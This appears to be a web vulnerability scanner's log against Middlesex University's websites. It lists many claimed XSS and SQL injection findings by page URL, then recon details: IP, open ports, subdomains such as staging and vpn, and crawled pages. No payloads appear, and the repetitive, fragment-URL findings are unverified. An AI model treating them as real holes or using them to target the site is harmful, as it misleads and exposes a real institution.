+2025-04-13 18:44:36,580 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/europe#
+2025-04-13 18:44:43,133 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/europe#
+2025-04-13 18:44:48,994 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 18:44:54,849 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 18:45:00,658 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 18:45:06,645 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 18:45:12,499 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 18:45:18,338 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 18:45:24,160 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 18:45:30,007 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 18:45:35,831 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 18:45:41,708 - WebSecScanner - INFO - [+] Vulnerability recorded: Cross-Site Scripting (XSS) at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 18:46:07,783 - WebSecScanner - INFO - Scanning for SQL Injection vulnerabilities
+2025-04-13 18:47:11,587 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:47:33,040 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:47:53,908 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:48:14,530 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:48:35,837 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:49:04,721 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/scholarships-and-grants
+2025-04-13 18:49:27,047 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:49:48,987 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:50:11,187 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:50:34,057 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:50:56,019 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:51:18,065 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime
+2025-04-13 18:51:39,823 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:52:01,772 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:52:24,340 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:52:45,860 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:53:07,680 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:53:29,406 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/mba-daytime#pathway
+2025-04-13 18:53:48,191 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/call-back
+2025-04-13 18:54:07,175 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/call-back
+2025-04-13 18:54:37,056 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/call-back
+2025-04-13 18:55:02,240 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/call-back
+2025-04-13 18:55:23,372 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/call-back
+2025-04-13 18:55:44,290 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/call-back
+2025-04-13 18:56:10,045 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:56:27,648 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:56:45,307 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:57:02,074 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:57:18,704 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:57:37,360 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-marketing
+2025-04-13 18:57:57,673 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe
+2025-04-13 18:58:18,672 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe
+2025-04-13 18:58:39,053 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe
+2025-04-13 18:58:59,804 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe
+2025-04-13 18:59:20,147 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe
+2025-04-13 18:59:40,826 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe
+2025-04-13 18:59:59,683 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 19:00:19,105 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 19:00:45,970 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 19:01:09,189 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 19:01:30,440 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 19:01:51,107 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance
+2025-04-13 19:02:12,742 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 19:02:33,552 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 19:02:53,751 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 19:03:14,999 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 19:03:36,704 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 19:03:58,405 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/bsc-honours-business-computing-and-data-analytics
+2025-04-13 19:04:18,398 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 19:04:39,614 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 19:05:01,311 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 19:05:24,109 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 19:05:45,369 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 19:06:07,569 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism
+2025-04-13 19:06:29,860 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 19:06:50,456 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 19:07:13,467 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 19:07:38,069 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 19:07:58,790 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 19:08:19,517 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems
+2025-04-13 19:08:41,426 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 19:09:06,050 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 19:09:27,895 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 19:09:49,635 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 19:10:12,280 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 19:10:33,151 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#PROGRAMME%20MODULES
+2025-04-13 19:10:53,574 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 19:11:13,267 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 19:11:34,834 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 19:11:55,849 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 19:12:16,546 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 19:12:37,497 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-psychology-with-counselling-skills
+2025-04-13 19:12:59,653 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 19:13:20,667 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 19:13:41,273 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 19:14:00,861 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 19:14:20,237 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 19:14:39,211 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-creative-writing-and-journalism#COURSE%20OVERVIEW
+2025-04-13 19:15:04,601 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 19:15:27,513 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 19:15:52,794 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 19:16:14,421 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 19:16:52,222 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 19:17:17,844 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#
+2025-04-13 19:17:39,321 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 19:18:03,098 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 19:18:25,568 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 19:18:50,463 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 19:19:13,660 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 19:19:50,683 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/ba-honours-business-management---finance#BA%20HONOURS%20BUSINESS%20MANAGEMENT%20FINANCE
+2025-04-13 19:20:13,537 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe#
+2025-04-13 19:20:47,465 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe#
+2025-04-13 19:21:09,551 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe#
+2025-04-13 19:21:50,309 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe#
+2025-04-13 19:22:14,889 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe#
+2025-04-13 19:22:41,769 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/europe#
+2025-04-13 19:23:05,419 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 19:23:30,233 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 19:23:52,152 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 19:24:14,452 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 19:24:41,587 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 19:25:06,646 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-information-technology
+2025-04-13 19:25:28,961 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 19:26:05,148 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 19:26:31,423 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 19:26:54,040 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 19:27:18,978 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 19:27:41,718 - WebSecScanner - INFO - [+] Vulnerability recorded: SQL Injection at https://www.mdx.ac.ae/courses/course-list/course-detail/bsc-honours-business-information-systems#FACULTY
+2025-04-13 19:29:42,563 - WebSecScanner - INFO - Scanning for CSRF vulnerabilities
+2025-04-13 19:29:42,563 - WebSecScanner - INFO - Scanning security headers
+2025-04-13 19:29:43,713 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Content-Security-Policy Header at https://www.mdx.ac.ae/
+2025-04-13 19:29:43,713 - WebSecScanner - INFO - [+] Vulnerability recorded: Missing Permissions-Policy Header at https://www.mdx.ac.ae/
+2025-04-13 19:29:43,713 - WebSecScanner - INFO - [+] Vulnerability recorded: Information Disclosure in HTTP Headers at https://www.mdx.ac.ae/
+2025-04-13 19:29:43,718 - WebSecScanner - INFO - [+] Vulnerability recorded: Information Disclosure in HTTP Headers at https://www.mdx.ac.ae/
+2025-04-13 19:29:43,718 - WebSecScanner - INFO - Scanning session security
+2025-04-13 19:29:44,616 - WebSecScanner - INFO - Security scans completed
+2025-04-13 19:29:44,635 - WebSecScanner - INFO - Report generated: reports\scan-20250413_192944.html
+2025-04-13 19:29:44,635 - WebSecScanner - INFO - Scan completed in 4632.74 seconds
+2025-04-13 19:29:44,635 - WebSecScanner - INFO - Found 202 vulnerabilities
+2025-04-13 20:14:44,540 - WebSecScanner - INFO - Scanner initialized for target: https://www.mdx.ac.uk/
+2025-04-13 20:14:44,545 - WebSecScanner - INFO - Starting scan of https://www.mdx.ac.uk/
+2025-04-13 20:14:44,553 - WebSecScanner - INFO - Starting reconnaissance phase
+2025-04-13 20:14:45,235 - WebSecScanner - INFO - Resolved IP: 18.66.218.33
+2025-04-13 20:14:45,235 - WebSecScanner - INFO - Server info: {'Server': 'Apache'}
+2025-04-13 20:14:45,745 - WebSecScanner - INFO - Detected technologies: ['Apache', 'Terminalfour']
+2025-04-13 20:14:47,755 - WebSecScanner - INFO - Open ports: [25, 80, 110, 143, 443, 993, 995]
+2025-04-13 20:14:47,755 - WebSecScanner - DEBUG - Found subdomain: www.mdx.ac.uk
+2025-04-13 20:14:47,933 - WebSecScanner - DEBUG - Found subdomain: smtp.mdx.ac.uk
+2025-04-13 20:14:48,979 - WebSecScanner - DEBUG - Found subdomain: vpn.mdx.ac.uk
+2025-04-13 20:14:49,714 - WebSecScanner - DEBUG - Found subdomain: staging.mdx.ac.uk
+2025-04-13 20:14:50,393 - WebSecScanner - INFO - Found 4 subdomains
+2025-04-13 20:14:50,396 - WebSecScanner - INFO - Starting website crawling
+2025-04-13 20:14:51,465 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/
+2025-04-13 20:15:00,695 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/postgraduate/apply-for-taught-courses/
+2025-04-13 20:15:02,401 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/international/international-student-life/
+2025-04-13 20:15:04,414 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/business-partnerships/supporting-our-region/
+2025-04-13 20:15:07,800 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/careers-at-middlesex/
+2025-04-13 20:15:10,337 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/equality-diversity-inclusion/
+2025-04-13 20:15:14,576 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/subjects/education/teacher-training/
+2025-04-13 20:15:21,975 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/our-people/vice-chancellor-and-executive/
+2025-04-13 20:15:24,023 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/undergraduate/
+2025-04-13 20:15:26,456 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/why-choose-middlesex/
+2025-04-13 20:15:29,235 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/student-life/chat-with-students/
+2025-04-13 20:15:59,254 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/student-life/chat-with-students/: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.uk/student-life/chat-with-students/", waiting until "networkidle"
+
+2025-04-13 20:15:59,255 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/postgraduate/request-a-postgraduate-prospectus/
+2025-04-13 20:16:05,888 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/equality-diversity-inclusion/race-equality/
+2025-04-13 20:16:10,283 - WebSecScanner - INFO - [Crawl] Visiting: https://apply.mdx.ac.uk/
+2025-04-13 20:16:15,935 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/get-in-touch/
+2025-04-13 20:16:17,612 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/postgraduate/employment-based-postgraduate-initial-teacher-training-itt/
+2025-04-13 20:16:47,620 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/courses/postgraduate/employment-based-postgraduate-initial-teacher-training-itt/: Page.goto: Timeout 30000ms exceeded.
+Call log:
+  - navigating to "https://www.mdx.ac.uk/courses/postgraduate/employment-based-postgraduate-initial-teacher-training-itt/", waiting until "networkidle"
+
+2025-04-13 20:16:47,620 - WebSecScanner - INFO - [Crawl] Visiting: https://misis.mdx.ac.uk/mislve/bwskalog.P_DispLoginNon#main_content
+2025-04-13 20:16:49,031 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/cmi-workplace-inclusion.pdf
+2025-04-13 20:16:49,236 - WebSecScanner - DEBUG - Error JS crawling https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/cmi-workplace-inclusion.pdf: Page.goto: net::ERR_ABORTED at https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/cmi-workplace-inclusion.pdf
+Call log:
+  - navigating to "https://www.mdx.ac.uk/media/middlesex-university/about-us-pdfs/cmi-workplace-inclusion.pdf", waiting until "networkidle"
+
+2025-04-13 20:16:49,237 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/business-partnerships/cpd-and-skills-for-your-organisation/
+2025-04-13 20:16:55,467 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/postgraduate/apply-for-taught-courses/#content
+2025-04-13 20:16:57,143 - WebSecScanner - INFO - [Crawl] Visiting: https://misis.mdx.ac.uk/mislve/twbksite.P_DispSiteMap?menu_name_in=bmenu.P_MainMnu&depth_in=2&columns_in=3
+2025-04-13 20:16:59,066 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/
+2025-04-13 20:17:01,254 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/research/sustainable-communities/
+2025-04-13 20:17:04,560 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/events/postgraduate-open-event/
+2025-04-13 20:17:06,828 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/facilities/
+2025-04-13 20:17:10,424 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/our-community/report-it-to-stop-it/
+2025-04-13 20:17:12,093 - WebSecScanner - INFO - [Crawl] Visiting: https://jobs.mdx.ac.uk/
+2025-04-13 20:17:14,835 - WebSecScanner - INFO - [Crawl] Visiting: https://misis.mdx.ac.uk/mislve/twbkwbis.P_GenMenu?name=homepage
+2025-04-13 20:17:17,194 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/courses/research-degrees/art-and-design-research-degrees/
+2025-04-13 20:17:21,160 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/equality-diversity-inclusion/race-equality/#c37892
+2025-04-13 20:17:22,645 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/about-us/equality-diversity-inclusion/reverse-mentoring-framework/
+2025-04-13 20:17:25,148 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/student-life/how-to-access-mymdx/
+2025-04-13 20:17:26,804 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/business-partnerships/academic-partnerships/
+2025-04-13 20:17:28,742 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/international/how-to-apply-as-a-international-student/
+2025-04-13 20:17:30,341 - WebSecScanner - INFO - [Crawl] Visiting: https://www.mdx.ac.uk/study/ways-to-study/
